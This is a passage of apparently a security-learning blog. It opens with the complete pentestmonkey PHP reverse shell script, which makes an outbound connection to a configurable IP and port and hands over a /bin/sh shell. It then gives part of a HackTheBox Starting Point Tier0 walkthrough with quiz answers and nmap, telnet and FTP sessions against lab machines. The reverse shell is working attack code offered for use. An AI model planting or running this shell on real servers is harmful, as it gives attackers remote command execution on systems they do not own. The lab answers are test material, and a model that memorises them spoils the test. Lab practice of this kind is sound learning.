+<p>扩展：php 反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// php-reverse-shell - A Reverse Shell implementation <span class="keyword">in</span> PHP</span><br><span class="line">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// This tool may be used <span class="keyword">for</span> legal purposes only.  Users take full responsibility</span><br><span class="line">// <span class="keyword">for</span> any actions performed using this tool.  The author accepts no liability</span><br><span class="line">// <span class="keyword">for</span> damage caused by this tool.  If these terms are not acceptable to you, <span class="keyword">then</span></span><br><span class="line">// <span class="keyword">do</span> not use this tool.</span><br><span class="line">//</span><br><span class="line">// In all other respects the GPL version 2 applies:</span><br><span class="line">//</span><br><span class="line">// This program is free software; you can redistribute it and/or modify</span><br><span class="line">// it under the terms of the GNU General Public License version 2 as</span><br><span class="line">// published by the Free Software Foundation.</span><br><span class="line">//</span><br><span class="line">// This program is distributed <span class="keyword">in</span> the hope that it will be useful,</span><br><span class="line">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line">// GNU General Public License <span class="keyword">for</span> more details.</span><br><span class="line">//</span><br><span class="line">// You should have received a copy of the GNU General Public License along</span><br><span class="line">// with this program; <span class="keyword">if</span> not, write to the Free Software Foundation, Inc.,</span><br><span class="line">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span><br><span class="line">//</span><br><span class="line">// This tool may be used <span class="keyword">for</span> legal purposes only.  Users take full responsibility</span><br><span class="line">// <span class="keyword">for</span> any actions performed using this tool.  If these terms are not acceptable to</span><br><span class="line">// you, <span class="keyword">then</span> <span class="keyword">do</span> not use this tool.</span><br><span class="line">//</span><br><span class="line">// You are encouraged to send comments, improvements or suggestions to</span><br><span class="line">// me at pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// Description</span><br><span class="line">// -----------</span><br><span class="line">// This script will make an outbound TCP connection to a hardcoded IP and port.</span><br><span class="line">// The recipient will be given a shell running as the current user (apache normally).</span><br><span class="line">//</span><br><span class="line">// Limitations</span><br><span class="line">// -----------</span><br><span class="line">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span><br><span class="line">// Use of stream_select() on file descriptors returned by proc_open() will fail and <span class="built_in">return</span> FALSE under Windows.</span><br><span class="line">// Some compile-time options are needed <span class="keyword">for</span> daemonisation (like pcntl, posix).  These are rarely available.</span><br><span class="line">//</span><br><span class="line">// Usage</span><br><span class="line">// -----</span><br><span class="line">// See http://pentestmonkey.net/tools/php-reverse-shell <span class="keyword">if</span> you get stuck.</span><br><span class="line"></span><br><span class="line">set_time_limit (0);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;127.0.0.1&#x27;</span>;  // CHANGE THIS</span><br><span class="line"><span class="variable">$port</span> = 1234;       // CHANGE THIS</span><br><span class="line"><span class="variable">$chunk_size</span> = 1400;</span><br><span class="line"><span class="variable">$write_a</span> = null;</span><br><span class="line"><span class="variable">$error_a</span> = null;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = 0;</span><br><span class="line"><span class="variable">$debug</span> = 0;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Daemonise ourself <span class="keyword">if</span> possible to avoid zombies later</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="line">// our php process and avoid zombies.  Worth a try...</span><br><span class="line"><span class="keyword">if</span> (function_exists(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">	// Fork and have the parent process <span class="built_in">exit</span></span><br><span class="line">	<span class="variable">$pid</span> = pcntl_fork();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$pid</span> == -1) &#123;</span><br><span class="line">		printit(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(1);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(0);  // Parent exits</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Make the current process a session leader</span><br><span class="line">	// Will only succeed <span class="keyword">if</span> we forked</span><br><span class="line">	<span class="keyword">if</span> (posix_setsid() == -1) &#123;</span><br><span class="line">		printit(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$daemon</span> = 1;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	printit(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Change to a safe directory</span><br><span class="line"><span class="built_in">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">// Remove any <span class="built_in">umask</span> we inherited</span><br><span class="line"><span class="built_in">umask</span>(0);</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Do the reverse shell...</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// Open reverse connection</span><br><span class="line"><span class="variable">$sock</span> = fsockopen(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">	printit(<span class="string">&quot;<span class="variable">$errstr</span> (<span class="variable">$errno</span>)&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Spawn shell process</span><br><span class="line"><span class="variable">$descriptorspec</span> = array(</span><br><span class="line">   0 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  // stdin is a pipe that the child will <span class="built_in">read</span> from</span><br><span class="line">   1 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  // stdout is a pipe that the child will write to</span><br><span class="line">   2 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   // stderr is a pipe that the child will write to</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = proc_open(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_resource(<span class="variable">$process</span>)) &#123;</span><br><span class="line">	printit(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Set everything to non-blocking</span><br><span class="line">// Reason: Occsionally reads will block, even though stream_select tells us they won<span class="string">&#x27;t</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[0], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[1], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[2], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($sock, 0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">while (1) &#123;</span></span><br><span class="line"><span class="string">	// Check for end of TCP connection</span></span><br><span class="line"><span class="string">	if (feof($sock)) &#123;</span></span><br><span class="line"><span class="string">		printit(&quot;ERROR: Shell connection terminated&quot;);</span></span><br><span class="line"><span class="string">		break;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// Check for end of STDOUT</span></span><br><span class="line"><span class="string">	if (feof($pipes[1])) &#123;</span></span><br><span class="line"><span class="string">		printit(&quot;ERROR: Shell process terminated&quot;);</span></span><br><span class="line"><span class="string">		break;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="string">	// command output is available on STDOUT or STDERR</span></span><br><span class="line"><span class="string">	$read_a = array($sock, $pipes[1], $pipes[2]);</span></span><br><span class="line"><span class="string">	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// If we can read from the TCP socket, send</span></span><br><span class="line"><span class="string">	// data to process&#x27;</span>s STDIN</span><br><span class="line">	<span class="keyword">if</span> (in_array(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">		<span class="variable">$input</span> = fread(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">		fwrite(<span class="variable">$pipes</span>[0], <span class="variable">$input</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// If we can <span class="built_in">read</span> from the process<span class="string">&#x27;s STDOUT</span></span><br><span class="line"><span class="string">	// send data down tcp connection</span></span><br><span class="line"><span class="string">	if (in_array($pipes[1], $read_a)) &#123;</span></span><br><span class="line"><span class="string">		if ($debug) printit(&quot;STDOUT READ&quot;);</span></span><br><span class="line"><span class="string">		$input = fread($pipes[1], $chunk_size);</span></span><br><span class="line"><span class="string">		if ($debug) printit(&quot;STDOUT: $input&quot;);</span></span><br><span class="line"><span class="string">		fwrite($sock, $input);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	// If we can read from the process&#x27;</span>s STDERR</span><br><span class="line">	// send data down tcp connection</span><br><span class="line">	<span class="keyword">if</span> (in_array(<span class="variable">$pipes</span>[2], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">		<span class="variable">$input</span> = fread(<span class="variable">$pipes</span>[2], <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">		fwrite(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$sock</span>);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[0]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[1]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[2]);</span><br><span class="line">proc_close(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">// Like <span class="built_in">print</span>, but does nothing <span class="keyword">if</span> we<span class="string">&#x27;ve daemonised ourself</span></span><br><span class="line"><span class="string">// (I can&#x27;</span>t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="line"><span class="keyword">function</span> printit (<span class="variable">$string</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;<span class="variable">$string</span>\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/05/17/Hackthebox-StartingPoint-Tier0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/kehan.jpg">
+      <meta itemprop="name" content="Aono">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aono Note">
+      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Aono Note">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/05/17/Hackthebox-StartingPoint-Tier0/" class="post-title-link" itemprop="url">Hackthebox-StartingPoint-Tier0</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-05-17 20:30:07 / 修改时间：20:36:24" itemprop="dateCreated datePublished" datetime="2026-05-17T20:30:07+08:00">2026-05-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HTB/" itemprop="url" rel="index"><span itemprop="name">HTB</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Tier0起点包含了：Meow、Fawn、Dancing和Redeemer4个非vip靶场，侧重于渗透测试的基本构建模块。</p>
+<h1 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h1><p>1.What does the acronym VM stand for?</p>
+<p>VM 这个缩写代表什么？</p>
+<p>Virtual Machine</p>
+<p>2.What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It’s also known as a console or shell.</p>
+<p>我们使用什么工具与操作系统交互，以便通过命令行发出命令，例如启动 VPN 连接的命令？它也被称为控制台或 shell。</p>
+<p>Terminal</p>
+<p>3.What service do we use to form our VPN connection into HTB labs?</p>
+<p>我们使用什么服务来建立与 HTB 实验室的 VPN 连接？</p>
+<p>openvpn</p>
+<p>4.What tool do we use to test our connection to the target with an ICMP echo request?</p>
+<p>我们使用什么工具来测试与目标设备的 ICMP 回显请求连接？</p>
+<p>ping</p>
+<p>5.What is the name of the most common tool for finding open ports on a target?</p>
+<p>查找目标系统上开放端口最常用的工具叫什么名字？</p>
+<p>nmap</p>
+<p>6.What service do we identify on port 23/tcp during our scans?</p>
+<p>我们在扫描过程中，在 23/tcp 端口上识别出了什么服务？</p>
+<p>telent</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- -v -min-rate 1000 10.129.125.52</span><br><span class="line"></span><br><span class="line">Discovered open port 23/tcp on 10.129.125.52</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">23/tcp open  telnet</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>7.What username is able to log into the target over telnet with a blank password?</p>
+<p>哪个用户名可以使用空密码通过 telnet 登录到目标主机？</p>
+<p>root</p>
+<p>8.Submit root flag  提交根标志</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.129.125.52</span><br><span class="line">Trying 10.129.125.52...</span><br><span class="line">Connected to 10.129.125.52.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line"></span><br><span class="line">  █  █         ▐▌     ▄█▄ █          ▄▄▄▄</span><br><span class="line">  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀</span><br><span class="line">  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Meow login: root</span><br><span class="line">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)</span><br><span class="line">Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0</span><br><span class="line">root@Meow:~# <span class="built_in">ls</span></span><br><span class="line">flag.txt  snap</span><br><span class="line">root@Meow:~# <span class="built_in">cat</span> flag.txt</span><br></pre></td></tr></table></figure>
+<h1 id="Fawn"><a href="#Fawn" class="headerlink" title="Fawn"></a>Fawn</h1><p>1.What does the 3-letter acronym FTP stand for?</p>
+<p>FTP 这三个字母的缩写代表什么？</p>
+<p>File Transfer Protocol</p>
+<p>2.Which port does the FTP service listen on usually?</p>
+<p>FTP 服务通常监听哪个端口？</p>
+<p>21</p>
+<p>3.FTP sends data in the clear, without any encryption. What acronym is used for a later protocol designed to provide similar functionality to FTP but securely, as an extension of the SSH protocol?</p>
+<p>FTP 以明文形式发送数据，不进行任何加密。后来出现了一种协议，旨在提供与 FTP 类似的功能，但更加安全，它是 SSH 协议的扩展，该协议的缩写是什么？</p>
+<p>SFTP</p>
+<p>4.What is the command we can use to send an ICMP echo request to test our connection to the target?</p>
+<p>我们可以使用什么命令发送 ICMP 回显请求来测试与目标的连接？</p>
+<p>ping</p>
+<p>5.From your scans, what version is FTP running on the target?</p>
+<p>根据扫描结果，目标主机上运行的是哪个版本的 FTP？</p>
+<p>vsftpd 3.0.3</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p 21 -sCV 10.129.125.53</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> nmap -p 21 -sCV 10.129.125.53</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> zyu:</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-10 23:28 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.129.125.53)</span><br><span class="line">Host is up (0.22s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.10.17.43</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session <span class="built_in">timeout</span> <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">Service Info: OS: Unix</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>6.From your scans, what OS type is running on the target?</p>
+<p>根据扫描结果，目标设备运行的是哪种操作系统？</p>
+<p>Unix</p>
+<p>7.What is the command we need to run in order to display the ‘ftp’ client help menu?</p>
+<p>要显示“ftp”客户端的帮助菜单，我们需要运行什么命令？</p>
+<p>ftp -?</p>
+<p>8.What is username that is used over FTP when you want to log in without having an account?</p>
+<p>当您想在没有帐户的情况下通过 FTP 登录时，使用的用户名是什么？</p>
+<p>anonymous</p>
+<p>9.What is the response code we get for the FTP message ‘Login successful’?</p>
+<p>对于“登录成功”的 FTP 消息，我们得到的响应代码是什么？</p>
+<p>230</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.129.125.53</span><br><span class="line">Connected to 10.129.125.53.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (10.129.125.53:zyu): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>10.There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.</p>
+<p>我们可以使用几个命令来列出 FTP 服务器上可用的文件和目录。一个是 dir 命令。另一个是 Linux 系统上常用的文件列表命令是什么？</p>
+<p>ls</p>
+<p>11.What is the command used to download the file we found on the FTP server?</p>
+<p>用来下载我们在 FTP 服务器上找到的文件的命令是什么？</p>
+<p>get</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; get flag.txt</span><br><span class="line"><span class="built_in">local</span>: flag.txt remote: flag.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||35044|)</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> flag.txt (32 bytes).</span><br><span class="line">100% |*******************************************************************************************************************|    32      105.57 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">32 bytes received <span class="keyword">in</span> 00:01 (0.02 KiB/s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>12.cat flag.txt</p>
+<h1 id="Dancing"><a href="#Dancing" class="headerlink" title="Dancing"></a>Dancing</h1><p>1.What does the 3-letter acronym SMB stand for?</p>
+<p>SMB 这三个字母的缩写代表什么？</p>
+<p> Server Message Block  </p>
+<p>2.What port does SMB use to operate at?</p>
+<p>SMB 协议使用哪个端口运行？</p>
+<p>445</p>
+<p>3.What is the service name for port 445 that came up in our Nmap scan?</p>
+<p>我们在 Nmap 扫描中发现的 445 端口的服务名称是什么？</p>
+<p>microsoft-ds</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p 445 -sCV 10.129.125.72</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> zyu:</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-11 02:35 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (10.129.125.72)</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">445/tcp open  microsoft-ds?</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   <span class="built_in">date</span>: 2026-05-11T10:36:35</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: 3h59m58s</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>4.What is the ‘flag’ or ‘switch’ that we can use with the smbclient utility to ‘list’ the available SMB shares on Dancing?</p>
+<p>我们可以使用 smbclient 工具的哪个“标志”或“开关”来“列出”Dancing 上可用的 SMB 共享？</p>
